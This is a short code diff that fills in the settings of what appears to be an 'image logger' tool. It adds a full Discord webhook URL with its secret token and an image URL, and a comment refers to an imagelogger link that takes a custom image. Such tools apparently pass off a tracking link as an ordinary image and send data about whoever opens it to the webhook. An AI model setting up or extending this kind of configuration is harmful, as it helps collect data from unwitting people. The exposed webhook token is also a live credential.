@@ -12,8 +12,8 @@ __author__ = "MUDL"
 
 config = {
     # BASE CONFIG #
-    "webhook": "Put-Webhook-addrss-here",
-    "image": "Image-url-here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1448358818223362070/fUhEHR2DBzfGZKOQKHuHCl3vulg-kgyU6KORGxdcU0MK9q736icLLUAZMM9mZrewIUbf",
+    "image": "https://static01.nyt.com/images/2020/01/28/multimedia/28xp-memekid3/28cp-memekid3-superJumbo.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
